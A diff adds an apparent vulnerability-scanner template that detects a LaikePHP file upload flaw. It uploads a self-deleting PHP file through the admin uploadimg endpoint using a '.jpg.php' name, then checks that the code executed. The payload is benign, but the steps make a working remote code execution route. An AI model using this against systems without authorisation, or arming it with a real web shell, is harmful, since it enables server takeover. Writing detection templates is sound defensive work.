@@ -1,0 +1,71 @@
+id: laikephp-file-upload-vuln
+info:
+  name: LaikePHP File Upload Vulnerability
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    This template identifies a file upload vulnerability in LaikePHP which allows arbitrary PHP code execution.
+
+variables:
+  f1: '{{rand_int(40000, 44800)}}'
+  rboundary: '{{rand_text_alpha(8)}}'
+  randname: '{{rand_text_alpha(6)}}'
+
+http:
+  - id: initial-check
+    method: GET
+    path:
+      - "{{BaseURL}}/admin/event/uploadimg.html"
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 500
+      - type: word
+        part: body
+        words:
+          - "editormd-image-file"
+
+  - id: file-upload
+    method: POST
+    path:
+      - "{{BaseURL}}/admin/event/uploadimg.html"
+    headers:
+      Content-Type: "multipart/form-data; boundary=----WebKitFormBoundary{{rboundary}}"
+    body: |
+      ------WebKitFormBoundary{{rboundary}}\r\n
+      Content-Disposition: form-data; name="editormd-image-file"; filename="{{randname}}.jpg.php"\r\n
+      Content-Type: application/octet-stream\r\n
+      <?php echo md5({{f1}});unlink(__FILE__);?>\r\n
+      ------WebKitFormBoundary{{rboundary}}--\r\n
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: regex
+        regex:
+          - ".php"
+    extractors:
+      - type: regex
+        name: dir
+        group: 1
+        regex:
+          - '"url":"(.+?)"'
+
+  - id: verify-upload
+    method: GET
+    path:
+      - "{{BaseURL}}/{{dir}}"
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "{{md5(f1)}}"
